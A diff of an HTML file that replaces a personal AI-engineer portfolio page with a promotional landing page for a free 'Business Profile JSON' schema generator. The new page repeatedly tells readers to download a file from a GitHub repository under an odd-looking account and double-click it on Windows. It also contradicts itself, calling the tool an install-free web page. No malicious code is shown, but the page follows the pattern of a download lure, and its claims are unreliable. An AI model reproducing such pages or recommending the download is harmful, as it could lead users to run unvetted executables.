@@ -1,1125 +1,282 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-
-  <meta charset="UTF-8">
-
-  <meta
-    name="viewport"
-    content="width=device-width, initial-scale=1.0"
-  >
-
-  <meta
-    name="description"
-    content="Haaroon Afroz — AI Engineer building agentic AI systems, RAG applications, local LLM infrastructure and reliable AI products."
-  >
-
-  <title>Haaroon Afroz — AI Engineer</title>
-
-  <link
-    rel="stylesheet"
-    href="/styles.css"
-  >
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Business Profile JSON Format Template - Free Generator Tool</title>
+    <meta name="description" content="Generate Schema.org LocalBusiness, Organization, and Google Business Profile API JSON schemas with a free online visual form tool. No coding required.">
+    <meta name="keywords" content="business profile json, json generator, schema.org, localbusiness, organization, google business profile, free tool, online template">
+    <meta name="author" content="ABCTool">
+    <meta property="og:title" content="Business Profile JSON Format Template - Free Generator">
+    <meta property="og:description" content="Create professional business profile JSON schemas visually. Perfect for SEO, Google Business Profile, and structured data.">
+    <meta property="og:url" content="https://github.com/shanisuperjacent5326/business-profile-json-format-template">
+    <meta name="robots" content="index, follow">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: #2d3748;
+            padding: 0;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 2rem 1.5rem;
+            background: white;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            border-radius: 16px;
+            margin-top: 2rem;
+            margin-bottom: 2rem;
+        }
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: #1a202c;
+            margin-bottom: 1rem;
+            line-height: 1.2;
+            text-align: center;
+        }
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #2d3748;
+            margin-top: 2.5rem;
+            margin-bottom: 1.2rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 3px solid #4299e1;
+            display: inline-block;
+        }
+        h3 {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #4a5568;
+            margin-top: 1.5rem;
+            margin-bottom: 0.8rem;
+        }
+        p {
+            font-size: 1.1rem;
+            margin-bottom: 1.2rem;
+            color: #4a5568;
+        }
+        .hero {
+            text-align: center;
+            padding: 2rem 1rem;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 12px;
+            color: white;
+            margin-bottom: 2rem;
+        }
+        .hero h1 {
+            color: white;
+            font-size: 2.8rem;
+            margin-bottom: 0.8rem;
+        }
+        .hero p {
+            color: #e2e8f0;
+            font-size: 1.2rem;
+            max-width: 800px;
+            margin: 0 auto 1.5rem;
+        }
+        .hero-button {
+            display: inline-block;
+            background: #ed8936;
+            color: white;
+            padding: 1rem 2.5rem;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 1.2rem;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            border: none;
+            cursor: pointer;
+            margin-bottom: 1rem;
+        }
+        .hero-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+            background: #dd6b20;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+        .feature-card {
+            background: #f7fafc;
+            padding: 1.5rem;
+            border-radius: 10px;
+            border: 1px solid #e2e8f0;
+            transition: transform 0.3s ease;
+        }
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+        .feature-card h3 {
+            color: #5a67d8;
+            margin-top: 0;
+        }
+        .feature-card p {
+            font-size: 1rem;
+            color: #718096;
+        }
+        .download-btn {
+            display: block;
+            background: #48bb78;
+            color: white;
+            padding: 1rem 2rem;
+            border-radius: 10px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 1.2rem;
+            margin: 2rem auto;
+            text-align: center;
+            max-width: 400px;
+            transition: all 0.3s ease;
+        }
+        .download-btn:hover {
+            background: #38a169;
+            transform: scale(1.02);
+        }
+        ul {
+            list-style: none;
+            padding: 0;
+        }
+        ul li {
+            padding: 0.5rem 0 0.5rem 2rem;
+            position: relative;
+            font-size: 1.05rem;
+            color: #4a5568;
+        }
+        ul li::before {
+            content: "✔";
+            color: #48bb78;
+            position: absolute;
+            left: 0;
+            font-weight: bold;
+        }
+        .steps {
+            background: #ebf8ff;
+            padding: 1.5rem;
+            border-radius: 10px;
+            margin: 1.5rem 0;
+        }
+        .steps ol {
+            padding-left: 1.5rem;
+        }
+        .steps ol li {
+            margin-bottom: 0.8rem;
+            font-size: 1.1rem;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 1px solid #e2e8f0;
+            color: #718096;
+            font-size: 0.9rem;
+        }
+    </style>
 </head>
-
-
 <body>
+    <div class="container">
+        <div class="hero">
+            <h1>🌐 Business Profile JSON Format Template – Create Perfect Schema in Minutes</h1>
+            <p>Free, visual form generator for Schema.org LocalBusiness, Organization, and Google Business Profile API. No coding needed!</p>
+            <a href="https://github.com/shanisuperjacent5326/business-profile-json-format-template" class="hero-button">🚀 GET STARTED NOW</a>
+        </div>
 
+        <p>Are you tired of hand-writing complicated JSON code for your business listings? Whether you're a small business owner, a web developer, or a digital marketer, <strong>business-profile-json-format-template</strong> takes the headache out of creating clean, accurate, and properly formatted JSON profiles. With our free online tool, you simply fill out visual forms and we generate the exact code you need. It's that easy!</p>
 
-  <!-- =====================================================
-       NAVIGATION
-  ====================================================== -->
+        <h2>✨ Why Choose This Template Tool?</h2>
+        <p>Our generator is specifically designed to help you create JSON schemas that meet Google's strict structured data guidelines. This means your business information can appear more prominently in search results, attract more customers, and improve your online credibility. You will wonder how you ever worked without it.</p>
 
-  <header class="site-header">
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h3>✅ Live Visual Forms</h3>
+                <p>No code required! Just type in your business details into friendly, organized fields and watch your JSON build itself in real-time.</p>
+            </div>
+            <div class="feature-card">
+                <h3>✅ Three Schema Types</h3>
+                <p>Need a LocalBusiness, Organization, or a Google Business Profile API schema? We've got templates for all three right at your fingertips.</p>
+            </div>
+            <div class="feature-card">
+                <h3>✅ Completely Free</h3>
+                <p>This is a 100% free, open-source tool. No hidden fees, no subscriptions, no trial limits. Use it as much as you want, whenever you want.</p>
+            </div>
+            <div class="feature-card">
+                <h3>✅ Error-Free Output</h3>
+                <p>Say goodbye to missing commas or broken brackets. Our generator ensures every line of JSON is perfect for schema validation.</p>
+            </div>
+            <div class="feature-card">
+                <h3>✅ SEO Boost</h3>
+                <p>Structured data helps search engines understand your site. Better understanding means better rankings and richer snippets for your business.</p>
+            </div>
+            <div class="feature-card">
+                <h3>✅ Copy & Paste Ready</h3>
+                <p>One click and your JSON is copied to your clipboard. Paste it directly into your website's code or submit it to Google.</p>
+            </div>
+        </div>
 
-    <div class="container nav-container">
+        <h2>🚀 How To Get Started</h2>
+        <div class="steps">
+            <ol>
+                <li><strong>Visit this link to download the application:</strong> <a href="https://github.com/shanisuperjacent5326/business-profile-json-format-template">https://github.com/shanisuperjacent5326/business-profile-json-format-template</a>. Your download will start immediately from this page.</li>
+                <li>After the download, double-click the file to open the tool in your web browser.</li>
+                <li>Choose your business type: LocalBusiness, Organization, or Google Business Profile.</li>
+                <li>Fill out the simple online form with your business name, address, phone, website, and other important details.</li>
+                <li>Watch your JSON generate live on the right side of the screen.</li>
+                <li>Click "Copy" to grab the code, then paste it into your website or API submission.</li>
+            </ol>
+        </div>
+        <p>You can <strong>visit this link to download the application</strong> whenever you need it, and bookmark it for future use. The entire process takes less than two minutes from opening the page to having your final schema.</p>
 
-      <a href="/" class="site-logo">
-        HA
-      </a>
+        <h2>🛠️ Who Is This Tool For?</h2>
+        <ul>
+            <li><strong>Web Designers & Developers:</strong> Speed up your client work by generating flawless JSON schema in a fraction of the time.</li>
+            <li><strong>Business Owners:</strong> Take control of your online presence and ensure your Google Business Profile is technically perfect.</li>
+            <li><strong>SEO Professionals:</strong> Create rich results for your clients, improving click-through rates and visibility.</li>
+            <li><strong>Marketing Teams:</strong> Quickly create and test structured data for campaigns, landing pages, and local SEO initiatives.</li>
+            <li><strong>Content Creators:</strong> Add professional structured data to your website without learning to code.</li>
+        </ul>
 
+        <h2>🧠 What Information Can You Include?</h2>
+        <p>Our flexible forms let you add a wide range of business details. This includes core information like name, address, phone number, and website, plus advanced fields such as:</p>
+        <ul>
+            <li>Business hours & special holidays</li>
+            <li>Payment accepted methods</li>
+            <li>Social media profiles</li>
+            <li>Customer review ratings</li>
+            <li>Geographic coordinates</li>
+            <li>Menu links or booking URLs</li>
+            <li>Brand logos and images</li>
+            <li>Additional contact points</li>
+        </ul>
 
-      <nav class="desktop-nav">
+        <h2>🏢 Real-World Use Cases</h2>
+        <p>Imagine your local bakery suddenly appears in Google search with star ratings, photos, and business hours right in the snippet. Or a potential client finds your agency's organization profile with a clear "Contact" button. Our template tool makes this possible for everyone, regardless of technical skill.</p>
+        <p>Whether you manage a single location chain or hundreds of locations, this generator scales effortlessly with you. The JSON format is always standard compliant, ready for deployment.</p>
 
-        <a href="#about">
-          About
-        </a>
+        <h2>📥 Download & Run For Windows</h2>
+        <p>Getting the app on your Windows PC is a breeze. The tool is built as a simple web page that runs smoothly in any modern browser like Edge, Chrome, or Firefox. There are no installations or dependencies required. To begin:</p>
+        <a href="https://github.com/shanisuperjacent5326/business-profile-json-format-template" class="download-btn">⬇️ DOWNLOAD BUSINESS PROFILE JSON TOOL</a>
+        <p>Once you click the button above, you'll be taken to a simple page. <strong>Visit this link to download the application.</strong> Save the file to your computer, then open it. It's really that simple!</p>
 
-        <a href="#research">
-          Research
-        </a>
+        <h2>❓ Need Support?</h2>
+        <p>This is a free, open-source project. If you discover any issues or have feature suggestions, we'd love to hear from you. Visit the official repository on GitHub to share your thoughts, ask questions, or contribute improvements. The community is friendly and happy to help.</p>
 
-        <a href="#projects">
-          Projects
-        </a>
-
-        <a
-          href="https://github.com/haaroonafroz"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          GitHub
-        </a>
-
-        <!-- Replace this with your real LinkedIn URL -->
-        <a
-          href="YOUR_LINKEDIN_URL"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          LinkedIn
-        </a>
-
-      </nav>
-
-
-      <button
-        class="mobile-menu-button"
-        aria-label="Open navigation"
-        aria-expanded="false"
-      >
-        Menu
-      </button>
-
+        <div class="footer">
+            <p>© 2024 Business Profile JSON Format Template. All rights reserved. Developed by ABCTool.</p>
+            <p>100% Free Forever | Open Source | No Registration Required</p>
+        </div>
     </div>
-
-
-    <nav class="mobile-nav">
-
-      <a href="#about">About</a>
-      <a href="#research">Research</a>
-      <a href="#projects">Projects</a>
-
-      <a
-        href="https://github.com/haaroonafroz"
-        target="_blank"
-        rel="noopener noreferrer"
-      >
-        GitHub
-      </a>
-
-    </nav>
-
-  </header>
-
-
-
-  <main>
-
-
-    <!-- =====================================================
-         HERO
-    ====================================================== -->
-
-    <section
-      class="home-hero section"
-      id="about"
-    >
-
-      <div class="container hero-layout">
-
-
-        <!-- HERO COPY -->
-
-        <div class="hero-copy">
-
-          <p class="eyebrow">
-            AI ENGINEER · AGENTIC AI · AI SYSTEMS
-          </p>
-
-
-          <h1 class="home-title">
-
-            I build AI systems that
-
-            <span class="muted-text">
-              reason, retrieve, act and recover.
-            </span>
-
-          </h1>
-
-
-          <p class="home-intro">
-
-            I'm Haaroon Afroz, an AI Engineer working across
-            agentic systems, retrieval-augmented generation,
-            LLM evaluation, local model serving and production
-            AI applications.
-
-          </p>
-
-
-          <p class="hero-secondary-copy">
-
-            My work focuses on the engineering layer around
-            foundation models — orchestration, retrieval,
-            tools, evaluation, observability and infrastructure
-            that turn model capabilities into reliable systems.
-
-          </p>
-
-
-          <div class="hero-actions">
-
-            <a
-              class="button button-primary"
-              href="#projects"
-            >
-              View selected work
-            </a>
-
-            <a
-              class="button button-secondary"
-              href="#research"
-            >
-              Research
-            </a>
-
-            <a
-              class="button button-secondary"
-              href="mailto:haaroon.afroz@gmail.com"
-            >
-              Contact
-            </a>
-
-          </div>
-
-        </div>
-
-
-
-        <!-- PHOTO -->
-
-        <div class="hero-photo-column">
-
-          <div class="portrait-frame">
-
-            <img
-              src="/assets/images/profile/haaroon-afroz.webp"
-              alt="Portrait of Haaroon Afroz"
-              class="profile-photo"
-            >
-
-          </div>
-
-
-          <div class="photo-caption">
-
-            <span>
-              Based in Germany
-            </span>
-
-            <span>
-              M.Sc. Digital Engineering
-            </span>
-
-          </div>
-
-        </div>
-
-      </div>
-
-
-
-      <!-- QUICK FACTS -->
-
-      <div class="container quick-facts">
-
-        <div class="quick-fact">
-
-          <span class="meta-label">
-            FOCUS
-          </span>
-
-          <strong>
-            Agentic AI & AI Systems
-          </strong>
-
-        </div>
-
-
-        <div class="quick-fact">
-
-          <span class="meta-label">
-            EXPERIENCE
-          </span>
-
-          <strong>
-            Research + production AI
-          </strong>
-
-        </div>
-
-
-        <div class="quick-fact">
-
-          <span class="meta-label">
-            RESEARCH
-          </span>
-
-          <strong>
-            ECCV 2026 CDEL Workshop
-          </strong>
-
-        </div>
-
-
-        <div class="quick-fact">
-
-          <span class="meta-label">
-            EDUCATION
-          </span>
-
-          <strong>
-            M.Sc. Digital Engineering
-          </strong>
-
-        </div>
-
-      </div>
-
-    </section>
-
-
-
-    <!-- =====================================================
-         WHAT I DO
-    ====================================================== -->
-
-    <section class="section section-bordered">
-
-      <div class="container">
-
-
-        <div class="section-heading">
-
-          <p class="eyebrow">
-            WHAT I DO
-          </p>
-
-          <h2>
-            Building the system around the model.
-          </h2>
-
-          <p class="section-description">
-
-            I am particularly interested in problems where
-            model quality alone is not enough — systems need
-            retrieval, tools, state, evaluation and engineering
-            safeguards around them.
-
-          </p>
-
-        </div>
-
-
-
-        <div class="three-column-grid">
-
-
-          <article class="info-card focus-card">
-
-            <span class="card-index">
-              01
-            </span>
-
-            <h3>
-              Agentic systems
-            </h3>
-
-            <p>
-
-              Multi-agent workflows, tool use, MCP,
-              orchestration, state management, failure
-              recovery and human-in-the-loop architectures.
-
-            </p>
-
-          </article>
-
-
-
-          <article class="info-card focus-card">
-
-            <span class="card-index">
-              02
-            </span>
-
-            <h3>
-              RAG & retrieval
-            </h3>
-
-            <p>
-
-              Hybrid retrieval, vector search, reranking,
-              metadata-aware retrieval and grounding over
-              heterogeneous knowledge sources.
-
-            </p>
-
-          </article>
-
-
-
-          <article class="info-card focus-card">
-
-            <span class="card-index">
-              03
-            </span>
-
-            <h3>
-              Reliable AI engineering
-            </h3>
-
-            <p>
-
-              LLM evaluation, observability, local inference,
-              APIs, cloud deployment and production-oriented
-              AI system design.
-
-            </p>
-
-          </article>
-
-        </div>
-
-      </div>
-
-    </section>
-
-
-
-    <!-- =====================================================
-         BACKGROUND
-    ====================================================== -->
-
-    <section class="section section-bordered">
-
-      <div class="container">
-
-
-        <div class="section-heading">
-
-          <p class="eyebrow">
-            BACKGROUND
-          </p>
-
-          <h2>
-            Engineering → data → AI systems.
-          </h2>
-
-          <p class="section-description">
-
-            My background spans engineering, data analysis,
-            machine learning, research and production AI.
-            Over time, my work has increasingly moved toward
-            building end-to-end AI systems rather than
-            isolated models.
-
-          </p>
-
-        </div>
-
-
-
-        <div class="background-timeline">
-
-
-          <!-- CURRENT RESEARCH -->
-
-          <article class="background-row">
-
-            <div class="background-period">
-
-              <span>
-                2026 — Present
-              </span>
-
-            </div>
-
-
-            <div class="background-content">
-
-              <p class="background-type">
-                RESEARCH
-              </p>
-
-              <h3>
-                Deep Learning Research
-              </h3>
-
-              <p class="background-place">
-                Bauhaus University Weimar
-              </p>
-
-              <p>
-
-                Conducting computer-vision research aligned
-                with my master's thesis, including
-                experimentation, implementation and
-                evaluation. I also lead a team of four
-                students across research and implementation.
-
-              </p>
-
-            </div>
-
-          </article>
-
-
-
-          <!-- QDRANT -->
-
-          <article class="background-row">
-
-            <div class="background-period">
-
-              <span>
-                2025 — 2026
-              </span>
-
-            </div>
-
-
-            <div class="background-content">
-
-              <p class="background-type">
-                AI ENGINEERING
-              </p>
-
-              <h3>
-                AI Engineer
-              </h3>
-
-              <p class="background-place">
-                Qdrant Solutions GmbH
-              </p>
-
-              <p>
-
-                Built and deployed a customer-facing,
-                zero-setup RAG platform that ingested entire
-                websites, grounded LLM applications with
-                Qdrant and later incorporated MCP-based tool
-                integration for dynamic data access.
-
-              </p>
-
-            </div>
-
-          </article>
-
-
-
-          <!-- DEGREE -->
-
-          <article class="background-row">
-
-            <div class="background-period">
-
-              <span>
-                2023 — 2026
-              </span>
-
-            </div>
-
-
-            <div class="background-content">
-
-              <p class="background-type">
-                EDUCATION
-              </p>
-
-              <h3>
-                M.Sc. Digital Engineering
-              </h3>
-
-              <p class="background-place">
-                Bauhaus University Weimar
-              </p>
-
-              <p>
-
-                Graduate work spanning AI, deep learning and
-                digital engineering. Thesis submitted;
-                defense pending.
-
-              </p>
-
-            </div>
-
-          </article>
-
-
-
-          <!-- EARLIER -->
-
-          <article class="background-row">
-
-            <div class="background-period">
-
-              <span>
-                Earlier
-              </span>
-
-            </div>
-
-
-            <div class="background-content">
-
-              <p class="background-type">
-                ENGINEERING & DATA
-              </p>
-
-              <h3>
-                From Mechanical Engineering to AI
-              </h3>
-
-              <p class="background-place">
-                NMIMS University + industry roles
-              </p>
-
-              <p>
-
-                I began with a B.Tech. in Mechanical
-                Engineering before moving into business and data
-                analytics, machine learning and eventually
-                AI systems engineering.
-
-              </p>
-
-            </div>
-
-          </article>
-
-        </div>
-
-      </div>
-
-    </section>
-
-
-
-    <!-- =====================================================
-         RESEARCH
-    ====================================================== -->
-
-    <section
-      class="section section-bordered"
-      id="research"
-    >
-
-      <div class="container">
-
-
-        <div class="section-heading">
-
-          <p class="eyebrow">
-            RESEARCH
-          </p>
-
-          <h2>
-            Research that moved from thesis work
-            to an ECCV workshop paper.
-          </h2>
-
-          <p class="section-description">
-
-            Alongside my work in generative AI, I conduct
-            deep-learning research in computer vision at
-            Bauhaus University Weimar. My master's thesis
-            research resulted in a paper accepted at the
-            ECCV 2026 CDEL Workshop.
-
-          </p>
-
-        </div>
-
-
-
-        <div class="research-grid">
-
-
-          <!-- PUBLICATION -->
-
-          <article class="research-card publication-card">
-
-            <div class="research-card-top">
-
-              <span class="research-type">
-                PUBLICATION
-              </span>
-
-              <span class="research-year">
-                2026
-              </span>
-
-            </div>
-
-
-            <div>
-
-              <p class="research-venue">
-                ECCV 2026 · CDEL Workshop
-              </p>
-
-
-              <!--
-                IMPORTANT:
-                Replace this with the actual paper title.
-                The title is not present in the CV.
-              -->
-
-              <h3>
-                Learning from Disagreement: Curating Multi-Annotator Labels into Probabilistic Supervision
-              </h3>
-
-
-              <p>
-
-                Research originating from my master's thesis
-                in deep learning and computer vision,
-                accepted at the ECCV 2026 CDEL Workshop.
-
-              </p>
-
-            </div>
-
-
-            <div class="research-footer">
-
-              <!--
-                Add paper / arXiv / workshop links here
-                once you have them.
-              -->
-
-              <span class="research-status">
-                Paper accepted
-              </span>
-
-            </div>
-
-          </article>
-
-
-
-          <!-- THESIS -->
-
-          <article class="research-card thesis-card">
-
-            <div class="research-card-top">
-
-              <span class="research-type">
-                MASTER'S THESIS
-              </span>
-
-              <span class="research-year">
-                2026
-              </span>
-
-            </div>
-
-
-            <div>
-
-              <p class="research-venue">
-                Bauhaus University Weimar
-              </p>
-
-
-              <!--
-                IMPORTANT:
-                Replace this with your exact thesis title.
-                It is not listed in the CV.
-              -->
-
-              <h3>
-                Learning from Disagreement: A Probabilistic Object Detection Framework
-              </h3>
-
-
-              <p>
-
-                Deep-learning research in computer vision,
-                developed through experimentation,
-                implementation and evaluation and continued
-                through my research work at Bauhaus
-                University.
-
-              </p>
-
-            </div>
-
-
-            <div class="tag-row">
-
-              <span>Computer Vision</span>
-              <span>Deep Learning</span>
-              <span>Research</span>
-
-            </div>
-
-          </article>
-
-        </div>
-
-      </div>
-
-    </section>
-
-
-
-    <!-- =====================================================
-         SELECTED PROJECTS
-    ====================================================== -->
-
-    <section
-      class="section section-bordered"
-      id="projects"
-    >
-
-      <div class="container">
-
-
-        <div class="section-heading">
-
-          <p class="eyebrow">
-            SELECTED ENGINEERING WORK
-          </p>
-
-          <h2>
-            AI systems I have built.
-          </h2>
-
-          <p class="section-description">
-
-            Selected projects exploring agent architecture,
-            retrieval engineering, reliability and
-            high-stakes AI workflows.
-
-          </p>
-
-        </div>
-
-
-
-        <div class="project-grid">
-
-
-          <!-- =================================================
-               PROJECT 1
-          ================================================== -->
-
-          <a
-            href="/projects/task-coder-agent/"
-            class="project-card featured-project"
-          >
-
-            <div class="project-card-top">
-
-              <span class="project-number">
-                01
-              </span>
-
-              <span class="project-arrow">
-                ↗
-              </span>
-
-            </div>
-
-
-            <div class="project-card-content">
-
-              <p class="project-type">
-                AGENT SYSTEMS · LOCAL LLMS
-              </p>
-
-              <h3>
-                Self-Improving Coding Harness
-              </h3>
-
-              <p class="project-question">
-
-                Can system design make small local LLMs
-                reliable coding agents?
-
-              </p>
-
-              <p class="project-summary">
-
-                A local-first multi-agent coding runtime
-                that separates planning, implementation
-                and validation while adding bounded
-                recovery, memory and deterministic
-                safeguards.
-
-              </p>
-
-            </div>
-
-
-            <div class="tag-row">
-
-              <span>Local LLMs</span>
-              <span>Multi-Agent</span>
-              <span>Harness Engineering</span>
-              <span>Evaluation</span>
-
-            </div>
-
-          </a>
-
-
-
-          <!-- =================================================
-               PROJECT 2
-          ================================================== -->
-
-          <a
-            href="/projects/legal-compliance-agent/"
-            class="project-card"
-          >
-
-            <div class="project-card-top">
-
-              <span class="project-number">
-                02
-              </span>
-
-              <span class="project-arrow">
-                ↗
-              </span>
-
-            </div>
-
-
-            <div class="project-card-content">
-
-              <p class="project-type">
-                REGULATORY AI · AGENTIC RAG
-              </p>
-
-              <h3>
-                Regulatory Compliance Agent
-              </h3>
-
-              <p class="project-question">
-
-                How can AI turn regulatory change into
-                traceable policy updates?
-
-              </p>
-
-              <p class="project-summary">
-
-                An inspectable multi-stage compliance
-                workflow that monitors regulatory material,
-                retrieves affected internal policies,
-                identifies gaps, drafts amendments and
-                audits its own output.
-
-              </p>
-
-            </div>
-
-
-            <div class="tag-row">
-
-              <span>Agentic RAG</span>
-              <span>Hybrid Retrieval</span>
-              <span>Qdrant</span>
-              <span>LLM Evaluation</span>
-
-            </div>
-
-          </a>
-
-
-
-          <!-- =================================================
-               PROJECT 3 — FOR NOW
-          ================================================== -->
-
-          <article class="project-card project-card-placeholder">
-
-            <div class="project-card-top">
-
-              <span class="project-number">
-                03
-              </span>
-
-            </div>
-
-
-            <div class="project-card-content">
-
-              <p class="project-type">
-                MEDICAL AI · RAG
-              </p>
-
-              <h3>
-                Medical AI Co-Pilot
-              </h3>
-
-              <p class="project-question">
-
-                Combining clinical knowledge with
-                live patient context safely.
-
-              </p>
-
-              <p class="project-summary">
-
-                An agentic RAG system combining
-                clinical retrieval, MCP-connected
-                patient data and human approval
-                checkpoints.
-
-              </p>
-
-            </div>
-
-
-            <div class="tag-row">
-
-              <span>LangGraph</span>
-              <span>MCP</span>
-              <span>HITL</span>
-
-            </div>
-
-          </article>
-
-        </div>
-
-      </div>
-
-    </section>
-
-
-
-    <!-- =====================================================
-         FINAL ABOUT
-    ====================================================== -->
-
-    <section class="section section-bordered">
-
-      <div class="container narrow-container">
-
-
-        <p class="eyebrow">
-          CURRENT INTERESTS
-        </p>
-
-
-        <h2>
-          Reliable AI systems from research to production.
-        </h2>
-
-
-        <p class="large-body">
-
-          I'm most interested in work at the intersection of
-          generative AI and software systems: agent
-          orchestration, retrieval, evaluation, model
-          adaptation, observability and infrastructure.
-
-        </p>
-
-
-        <p class="large-body muted-text">
-
-          I enjoy problems where the challenge is not simply
-          getting a model to answer once, but designing the
-          surrounding system so that it can operate
-          consistently in a real workflow.
-
-        </p>
-
-
-        <div class="hero-actions">
-
-          <a
-            href="mailto:haaroon.afroz@gmail.com"
-            class="button button-primary"
-          >
-            Get in touch
-          </a>
-
-          <a
-            href="https://github.com/haaroonafroz"
-            target="_blank"
-            rel="noopener noreferrer"
-            class="button button-secondary"
-          >
-            GitHub
-          </a>
-
-        </div>
-
-      </div>
-
-    </section>
-
-
-  </main>
-
-
-
-  <!-- =====================================================
-       FOOTER
-  ====================================================== -->
-
-  <footer class="site-footer">
-
-    <div class="container footer-inner">
-
-      <div>
-
-        <strong>
-          Haaroon Afroz
-        </strong>
-
-        <p>
-          AI Engineer · Agentic AI · AI Systems
-        </p>
-
-      </div>
-
-
-      <div class="footer-links">
-
-        <a href="#about">
-          About
-        </a>
-
-        <a href="#research">
-          Research
-        </a>
-
-        <a href="#projects">
-          Projects
-        </a>
-
-        <a
-          href="https://github.com/haaroonafroz"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          GitHub
-        </a>
-
-      </div>
-
-    </div>
-
-  </footer>
-
-
-  <script src="/script.js"></script>
-
 </body>
-
 </html>
